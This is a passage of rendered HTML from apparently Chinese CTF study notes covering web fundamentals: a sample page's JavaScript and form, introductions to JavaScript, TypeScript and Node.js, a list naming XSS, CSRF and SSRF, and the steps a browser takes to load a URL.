</span><span id="__span-5-80"><a id="__codelineno-5-80" name="__codelineno-5-80" href="#note-ctf-web-__codelineno-5-80"></a><span class="w">            </span><span class="k">color</span><span class="p">:</span><span class="w"> </span><span class="mh">#fff</span><span class="p">;</span>
</span><span id="__span-5-81"><a id="__codelineno-5-81" name="__codelineno-5-81" href="#note-ctf-web-__codelineno-5-81"></a><span class="w">            </span><span class="k">padding</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="kt">px</span><span class="w"> </span><span class="mi">20</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-5-82"><a id="__codelineno-5-82" name="__codelineno-5-82" href="#note-ctf-web-__codelineno-5-82"></a><span class="w">            </span><span class="k">border</span><span class="p">:</span><span class="w"> </span><span class="kc">none</span><span class="p">;</span>
</span><span id="__span-5-83"><a id="__codelineno-5-83" name="__codelineno-5-83" href="#note-ctf-web-__codelineno-5-83"></a><span class="w">            </span><span class="k">border-radius</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="kt">px</span><span class="p">;</span>
</span><span id="__span-5-84"><a id="__codelineno-5-84" name="__codelineno-5-84" href="#note-ctf-web-__codelineno-5-84"></a><span class="w">            </span><span class="k">cursor</span><span class="p">:</span><span class="w"> </span><span class="kc">pointer</span><span class="p">;</span>
</span><span id="__span-5-85"><a id="__codelineno-5-85" name="__codelineno-5-85" href="#note-ctf-web-__codelineno-5-85"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-86"><a id="__codelineno-5-86" name="__codelineno-5-86" href="#note-ctf-web-__codelineno-5-86"></a>
</span><span id="__span-5-87"><a id="__codelineno-5-87" name="__codelineno-5-87" href="#note-ctf-web-__codelineno-5-87"></a><span class="w">        </span><span class="nt">form</span><span class="w"> </span><span class="nt">input</span><span class="o">[</span><span class="nt">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="o">]</span><span class="p">:</span><span class="nd">hover</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-88"><a id="__codelineno-5-88" name="__codelineno-5-88" href="#note-ctf-web-__codelineno-5-88"></a><span class="w">            </span><span class="k">background-color</span><span class="p">:</span><span class="w"> </span><span class="mh">#555</span><span class="p">;</span>
</span><span id="__span-5-89"><a id="__codelineno-5-89" name="__codelineno-5-89" href="#note-ctf-web-__codelineno-5-89"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-90"><a id="__codelineno-5-90" name="__codelineno-5-90" href="#note-ctf-web-__codelineno-5-90"></a><span class="w">    </span><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span><span id="__span-5-91"><a id="__codelineno-5-91" name="__codelineno-5-91" href="#note-ctf-web-__codelineno-5-91"></a>    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-5-92"><a id="__codelineno-5-92" name="__codelineno-5-92" href="#note-ctf-web-__codelineno-5-92"></a><span class="w">        </span><span class="c1">// JavaScript 代码</span>
</span><span id="__span-5-93"><a id="__codelineno-5-93" name="__codelineno-5-93" href="#note-ctf-web-__codelineno-5-93"></a><span class="w">        </span><span class="kd">function</span><span class="w"> </span><span class="nx">greetUser</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-94"><a id="__codelineno-5-94" name="__codelineno-5-94" href="#note-ctf-web-__codelineno-5-94"></a><span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">prompt</span><span class="p">(</span><span class="s2">&quot;请输入您的名字:&quot;</span><span class="p">);</span>
</span><span id="__span-5-95"><a id="__codelineno-5-95" name="__codelineno-5-95" href="#note-ctf-web-__codelineno-5-95"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-96"><a id="__codelineno-5-96" name="__codelineno-5-96" href="#note-ctf-web-__codelineno-5-96"></a><span class="w">                </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;你好, &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;!&quot;</span><span class="p">);</span>
</span><span id="__span-5-97"><a id="__codelineno-5-97" name="__codelineno-5-97" href="#note-ctf-web-__codelineno-5-97"></a><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-98"><a id="__codelineno-5-98" name="__codelineno-5-98" href="#note-ctf-web-__codelineno-5-98"></a><span class="w">                </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;你好, 访客!&quot;</span><span class="p">);</span>
</span><span id="__span-5-99"><a id="__codelineno-5-99" name="__codelineno-5-99" href="#note-ctf-web-__codelineno-5-99"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-5-100"><a id="__codelineno-5-100" name="__codelineno-5-100" href="#note-ctf-web-__codelineno-5-100"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-101"><a id="__codelineno-5-101" name="__codelineno-5-101" href="#note-ctf-web-__codelineno-5-101"></a>
</span><span id="__span-5-102"><a id="__codelineno-5-102" name="__codelineno-5-102" href="#note-ctf-web-__codelineno-5-102"></a><span class="w">        </span><span class="kd">function</span><span class="w"> </span><span class="nx">validateForm</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-103"><a id="__codelineno-5-103" name="__codelineno-5-103" href="#note-ctf-web-__codelineno-5-103"></a><span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
</span><span id="__span-5-104"><a id="__codelineno-5-104" name="__codelineno-5-104" href="#note-ctf-web-__codelineno-5-104"></a><span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;email&quot;</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
</span><span id="__span-5-105"><a id="__codelineno-5-105" name="__codelineno-5-105" href="#note-ctf-web-__codelineno-5-105"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">name</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-5-106"><a id="__codelineno-5-106" name="__codelineno-5-106" href="#note-ctf-web-__codelineno-5-106"></a><span class="w">                </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;请填写所有字段！&quot;</span><span class="p">);</span>
</span><span id="__span-5-107"><a id="__codelineno-5-107" name="__codelineno-5-107" href="#note-ctf-web-__codelineno-5-107"></a><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
</span><span id="__span-5-108"><a id="__codelineno-5-108" name="__codelineno-5-108" href="#note-ctf-web-__codelineno-5-108"></a><span class="w">            </span><span class="p">}</span>
</span><span id="__span-5-109"><a id="__codelineno-5-109" name="__codelineno-5-109" href="#note-ctf-web-__codelineno-5-109"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
</span><span id="__span-5-110"><a id="__codelineno-5-110" name="__codelineno-5-110" href="#note-ctf-web-__codelineno-5-110"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-5-111"><a id="__codelineno-5-111" name="__codelineno-5-111" href="#note-ctf-web-__codelineno-5-111"></a><span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-5-112"><a id="__codelineno-5-112" name="__codelineno-5-112" href="#note-ctf-web-__codelineno-5-112"></a><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span><span id="__span-5-113"><a id="__codelineno-5-113" name="__codelineno-5-113" href="#note-ctf-web-__codelineno-5-113"></a><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span><span id="__span-5-114"><a id="__codelineno-5-114" name="__codelineno-5-114" href="#note-ctf-web-__codelineno-5-114"></a>    <span class="p">&lt;</span><span class="nt">header</span><span class="p">&gt;</span>
</span><span id="__span-5-115"><a id="__codelineno-5-115" name="__codelineno-5-115" href="#note-ctf-web-__codelineno-5-115"></a>        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>欢迎来到我的网站<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span><span id="__span-5-116"><a id="__codelineno-5-116" name="__codelineno-5-116" href="#note-ctf-web-__codelineno-5-116"></a>        <span class="p">&lt;</span><span class="nt">nav</span><span class="p">&gt;</span>
</span><span id="__span-5-117"><a id="__codelineno-5-117" name="__codelineno-5-117" href="#note-ctf-web-__codelineno-5-117"></a>            <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
</span><span id="__span-5-118"><a id="__codelineno-5-118" name="__codelineno-5-118" href="#note-ctf-web-__codelineno-5-118"></a>                <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#home&quot;</span><span class="p">&gt;</span>首页<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span><span id="__span-5-119"><a id="__codelineno-5-119" name="__codelineno-5-119" href="#note-ctf-web-__codelineno-5-119"></a>                <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#about&quot;</span><span class="p">&gt;</span>关于我们<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span><span id="__span-5-120"><a id="__codelineno-5-120" name="__codelineno-5-120" href="#note-ctf-web-__codelineno-5-120"></a>                <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#contact&quot;</span><span class="p">&gt;</span>联系我们<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
</span><span id="__span-5-121"><a id="__codelineno-5-121" name="__codelineno-5-121" href="#note-ctf-web-__codelineno-5-121"></a>            <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
</span><span id="__span-5-122"><a id="__codelineno-5-122" name="__codelineno-5-122" href="#note-ctf-web-__codelineno-5-122"></a>        <span class="p">&lt;/</span><span class="nt">nav</span><span class="p">&gt;</span>
</span><span id="__span-5-123"><a id="__codelineno-5-123" name="__codelineno-5-123" href="#note-ctf-web-__codelineno-5-123"></a>    <span class="p">&lt;/</span><span class="nt">header</span><span class="p">&gt;</span>
</span><span id="__span-5-124"><a id="__codelineno-5-124" name="__codelineno-5-124" href="#note-ctf-web-__codelineno-5-124"></a>    <span class="p">&lt;</span><span class="nt">main</span><span class="p">&gt;</span>
</span><span id="__span-5-125"><a id="__codelineno-5-125" name="__codelineno-5-125" href="#note-ctf-web-__codelineno-5-125"></a>        <span class="p">&lt;</span><span class="nt">section</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;home&quot;</span><span class="p">&gt;</span>
</span><span id="__span-5-126"><a id="__codelineno-5-126" name="__codelineno-5-126" href="#note-ctf-web-__codelineno-5-126"></a>            <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>首页<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span><span id="__span-5-127"><a id="__codelineno-5-127" name="__codelineno-5-127" href="#note-ctf-web-__codelineno-5-127"></a>            <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;intro&quot;</span><span class="p">&gt;</span>这是我们的首页，欢迎您的到来！<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span><span id="__span-5-128"><a id="__codelineno-5-128" name="__codelineno-5-128" href="#note-ctf-web-__codelineno-5-128"></a>            <span class="p">&lt;</span><span class="nt">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&quot;greetUser()&quot;</span><span class="p">&gt;</span>打招呼<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span><span id="__span-5-129"><a id="__codelineno-5-129" name="__codelineno-5-129" href="#note-ctf-web-__codelineno-5-129"></a>        <span class="p">&lt;/</span><span class="nt">section</span><span class="p">&gt;</span>
</span><span id="__span-5-130"><a id="__codelineno-5-130" name="__codelineno-5-130" href="#note-ctf-web-__codelineno-5-130"></a>        <span class="p">&lt;</span><span class="nt">section</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;about&quot;</span><span class="p">&gt;</span>
</span><span id="__span-5-131"><a id="__codelineno-5-131" name="__codelineno-5-131" href="#note-ctf-web-__codelineno-5-131"></a>            <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>关于我们<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span><span id="__span-5-132"><a id="__codelineno-5-132" name="__codelineno-5-132" href="#note-ctf-web-__codelineno-5-132"></a>            <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;intro&quot;</span><span class="p">&gt;</span>我们是一家专业的Web开发公司。<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span><span id="__span-5-133"><a id="__codelineno-5-133" name="__codelineno-5-133" href="#note-ctf-web-__codelineno-5-133"></a>        <span class="p">&lt;/</span><span class="nt">section</span><span class="p">&gt;</span>
</span><span id="__span-5-134"><a id="__codelineno-5-134" name="__codelineno-5-134" href="#note-ctf-web-__codelineno-5-134"></a>        <span class="p">&lt;</span><span class="nt">section</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;contact&quot;</span><span class="p">&gt;</span>
</span><span id="__span-5-135"><a id="__codelineno-5-135" name="__codelineno-5-135" href="#note-ctf-web-__codelineno-5-135"></a>            <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>联系我们<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span><span id="__span-5-136"><a id="__codelineno-5-136" name="__codelineno-5-136" href="#note-ctf-web-__codelineno-5-136"></a>            <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;intro&quot;</span><span class="p">&gt;</span>如果您有任何问题，请随时联系我们。<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span><span id="__span-5-137"><a id="__codelineno-5-137" name="__codelineno-5-137" href="#note-ctf-web-__codelineno-5-137"></a>            <span class="p">&lt;</span><span class="nt">form</span> <span class="na">onsubmit</span><span class="o">=</span><span class="s">&quot;return validateForm()&quot;</span><span class="p">&gt;</span>
</span><span id="__span-5-138"><a id="__codelineno-5-138" name="__codelineno-5-138" href="#note-ctf-web-__codelineno-5-138"></a>                <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;name&quot;</span><span class="p">&gt;</span>姓名:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span><span id="__span-5-139"><a id="__codelineno-5-139" name="__codelineno-5-139" href="#note-ctf-web-__codelineno-5-139"></a>                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;name&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;name&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span><span id="__span-5-140"><a id="__codelineno-5-140" name="__codelineno-5-140" href="#note-ctf-web-__codelineno-5-140"></a>                <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;email&quot;</span><span class="p">&gt;</span>邮箱:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span><span id="__span-5-141"><a id="__codelineno-5-141" name="__codelineno-5-141" href="#note-ctf-web-__codelineno-5-141"></a>                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span><span id="__span-5-142"><a id="__codelineno-5-142" name="__codelineno-5-142" href="#note-ctf-web-__codelineno-5-142"></a>                <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;提交&quot;</span><span class="p">&gt;</span>
</span><span id="__span-5-143"><a id="__codelineno-5-143" name="__codelineno-5-143" href="#note-ctf-web-__codelineno-5-143"></a>            <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span><span id="__span-5-144"><a id="__codelineno-5-144" name="__codelineno-5-144" href="#note-ctf-web-__codelineno-5-144"></a>        <span class="p">&lt;/</span><span class="nt">section</span><span class="p">&gt;</span>
</span><span id="__span-5-145"><a id="__codelineno-5-145" name="__codelineno-5-145" href="#note-ctf-web-__codelineno-5-145"></a>    <span class="p">&lt;/</span><span class="nt">main</span><span class="p">&gt;</span>
</span><span id="__span-5-146"><a id="__codelineno-5-146" name="__codelineno-5-146" href="#note-ctf-web-__codelineno-5-146"></a>    <span class="p">&lt;</span><span class="nt">footer</span><span class="p">&gt;</span>
</span><span id="__span-5-147"><a id="__codelineno-5-147" name="__codelineno-5-147" href="#note-ctf-web-__codelineno-5-147"></a>        <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span><span class="ni">&amp;copy;</span> 2023 我的网站<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span><span id="__span-5-148"><a id="__codelineno-5-148" name="__codelineno-5-148" href="#note-ctf-web-__codelineno-5-148"></a>    <span class="p">&lt;/</span><span class="nt">footer</span><span class="p">&gt;</span>
</span><span id="__span-5-149"><a id="__codelineno-5-149" name="__codelineno-5-149" href="#note-ctf-web-__codelineno-5-149"></a><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span><span id="__span-5-150"><a id="__codelineno-5-150" name="__codelineno-5-150" href="#note-ctf-web-__codelineno-5-150"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></code></pre></div>
</details>
<ul>
<li>现代的解决方式：使用前端框架<ul>
<li>React.js Vue.js … 但本质上还是原生js</li>
</ul>
</li>
</ul>
<h3 id="note-ctf-web-javascript-typescript">编码基础：JavaScript 与 TypeScript<a class="headerlink" href="#note-ctf-web-javascript-typescript" title="Permanent link">&para;</a></h3>
<h4 id="note-ctf-web-javascript">JavaScript<a class="headerlink" href="#note-ctf-web-javascript" title="Permanent link">&para;</a></h4>
<p><strong>JavaScript 简介与历史</strong></p>
<p>JavaScript（简称JS）是由Netscape公司的Brendan Eich在1995年十天内开发出来的一种脚本语言。最初设计用于浏览器端的动态网页内容生成，JavaScript迅速成为Web开发的核心技术之一，与HTML和CSS并列为前端开发的三大支柱。</p>
<ul>
<li><strong>诞生背景</strong>：JavaScript诞生于Web 1.0时代，最初被称为Mocha，后改名为LiveScript，最后才成为JavaScript。</li>
<li><strong>发展历程</strong>：从最初的客户端脚本语言，JavaScript逐步演变成一门强大的编程语言，现今不仅用于浏览器端，还在服务器端广泛应用。</li>
</ul>
<p><strong>JavaScript的基本语法和特点</strong></p>
<p>JavaScript语法灵活，具有动态类型、函数式编程和原型继承等特点。</p>
<ul>
<li>
<p><strong>变量声明</strong>：使用<code>var</code>、<code>let</code>和<code>const</code>声明变量。</p>
<div class="language-jsx highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-ctf-web-__codelineno-6-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5</span><span class="p">;</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-ctf-web-__codelineno-6-2"></a><span class="kd">let</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">10</span><span class="p">;</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#note-ctf-web-__codelineno-6-3"></a><span class="kd">const</span><span class="w"> </span><span class="nx">z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">15</span><span class="p">;</span>
</span></code></pre></div>
</li>
<li>
<p><strong>函数定义</strong>：</p>
<div class="language-jsx highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-ctf-web-__codelineno-7-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">add</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span><span class="w"> </span><span class="nx">b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-ctf-web-__codelineno-7-2"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">b</span><span class="p">;</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-ctf-web-__codelineno-7-3"></a><span class="p">}</span>
</span></code></pre></div>
</li>
<li>
<p><strong>条件判断</strong>：
    <div class="language-jsx highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-ctf-web-__codelineno-8-1"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">y</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#note-ctf-web-__codelineno-8-2"></a><span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;x is greater than y&quot;</span><span class="p">);</span>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#note-ctf-web-__codelineno-8-3"></a><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#note-ctf-web-__codelineno-8-4"></a><span class="w">  </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;x is less than or equal to y&quot;</span><span class="p">);</span>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#note-ctf-web-__codelineno-8-5"></a><span class="p">}</span>
</span></code></pre></div>
​</p>
</li>
<li><strong>循环</strong>：
   <div class="language-jsx highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#note-ctf-web-__codelineno-9-1"></a><span class="w">   </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">5</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#note-ctf-web-__codelineno-9-2"></a><span class="w">     </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#note-ctf-web-__codelineno-9-3"></a><span class="w">   </span><span class="p">}</span>
</span></code></pre></div></li>
</ul>
<p>​
  - <strong>事件处理</strong>：
    <div class="language-jsx highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#note-ctf-web-__codelineno-10-1"></a><span class="w">  </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;myButton&quot;</span><span class="p">).</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;click&quot;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#note-ctf-web-__codelineno-10-2"></a><span class="w">    </span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Button clicked!&quot;</span><span class="p">);</span>
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#note-ctf-web-__codelineno-10-3"></a><span class="w">  </span><span class="p">});</span>
</span></code></pre></div>
JavaScript灵活性很强，但这也带来了某些潜在问题，比如类型不安全、代码维护性差等</p>
<h4 id="note-ctf-web-typescript">TypeScript<a class="headerlink" href="#note-ctf-web-typescript" title="Permanent link">&para;</a></h4>
<p><strong>TypeScript的特点和优点</strong></p>
<p>TypeScript（简称TS）是由微软开发的一种开源编程语言，是JavaScript的超集，增加了静态类型和类等特性。</p>
<ul>
<li><strong>静态类型</strong>：通过类型检查减少运行时错误，提高代码的可维护性。</li>
<li><strong>类和接口</strong>：支持面向对象编程，增强代码结构性</li>
<li><strong>模块化</strong>：支持模块化编程，提高代码复用性和组织性</li>
</ul>
<h3 id="note-ctf-web-nodejs">Node.js简介<a class="headerlink" href="#note-ctf-web-nodejs" title="Permanent link">&para;</a></h3>
<p><strong>Node.js的起源和发展</strong></p>
<p>Node.js是由Ryan Dahl在2009年开发的一个开源、跨平台的JavaScript运行时环境，基于Chrome的V8引擎构建。Node.js的出现使得JavaScript可以用于服务器端开发。</p>
<ul>
<li><strong>起源</strong>：Node.js诞生于对高性能、非阻塞I/O模型的需求。</li>
<li><strong>发展</strong>：Node.js迅速发展，成为构建高性能、可扩展网络应用的首选平台。</li>
</ul>
<p><strong>Node.js的基本使用方法与应用场景</strong></p>
<p>Node.js通过事件驱动、非阻塞I/O模型，使其在处理大量并发请求时具有显著优势。</p>
<h3 id="note-ctf-web-_6">前端相关安全领域<a class="headerlink" href="#note-ctf-web-_6" title="Permanent link">&para;</a></h3>
<ul>
<li>XSS（跨站脚本攻击）</li>
<li>CSRF（跨站请求伪造）与 SSRF（服务器端请求伪造）</li>
<li>跨域 </li>
</ul>
<h3 id="note-ctf-web-_7">尾声<a class="headerlink" href="#note-ctf-web-_7" title="Permanent link">&para;</a></h3>
<p>经典老番：地址栏输入网址并访问后发生了什么</p>
<ol>
<li><strong>DNS解析（域名解析）</strong>：<ul>
<li>浏览器会首先检查本地缓存中是否有该网址对应的IP地址。</li>
<li>如果没有，它会向DNS服务器发送请求，查询该网址的IP地址。</li>
<li>DNS服务器返回该网址对应的IP地址给浏览器。</li>
</ul>
</li>
<li><strong>建立TCP连接</strong>：<ul>
<li>浏览器使用前面得到的IP地址，通过TCP/IP协议与目标服务器建立连接。</li>
<li>这包括<a href="https://blog.csdn.net/m0_56649557/article/details/119492899">三次握手</a>过程：客户端发送SYN包，服务器返回SYN-ACK包，客户端再发送ACK包确认连接。</li>
</ul>
</li>
<li><strong>发送HTTP请求</strong>：<ul>
<li>建立连接后，浏览器会发送一个HTTP请求到服务器。这个请求包含了请求方法（如GET或POST）、请求的资源路径以及一些头信息（如浏览器类型、可接受的文件类型等）。</li>
</ul>
</li>
<li><strong>服务器处理请求并返回响应</strong>：<ul>
<li>服务器接收到请求后，会处理该请求，查找请求的资源（如HTML文件、图片、视频等）。</li>
<li>服务器会将找到的资源以及一些头信息（如内容类型、内容长度等）打包成HTTP响应，返回给浏览器。</li>
</ul>
</li>
<li><strong>浏览器接收响应并渲染页面</strong>：<ul>
<li>浏览器接收到服务器返回的HTTP响应后，会解析响应的头信息和内容。</li>
<li>如果内容是HTML文件，浏览器会解析HTML并根据其中的指令（如加载CSS文件、执行JavaScript脚本等）进行渲染。</li>
<li>浏览器会逐步构建DOM树和CSSOM树，并根据它们生成渲染树，最后将内容绘制到屏幕上。</li>
</ul>
</li>
<li><strong>加载资源</strong>：<ul>
<li>如果HTML文件中包含了其他资源（如图片、CSS、JavaScript等），浏览器会根据需要发送额外的HTTP请求来加载这些资源。</li>
<li>这些资源加载完成后，浏览器会继续渲染页面，更新显示内容。
整个过程通常在短时间内完成，以确保用户能够快速看到网页内容。</li>
</ul>
</li>
</ol></section><section class="print-page" id="note-ctf-misc" heading-number="2.5.1.3"><h1 id="note-ctf-misc-note-ctf-misc">Misc</h1><div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
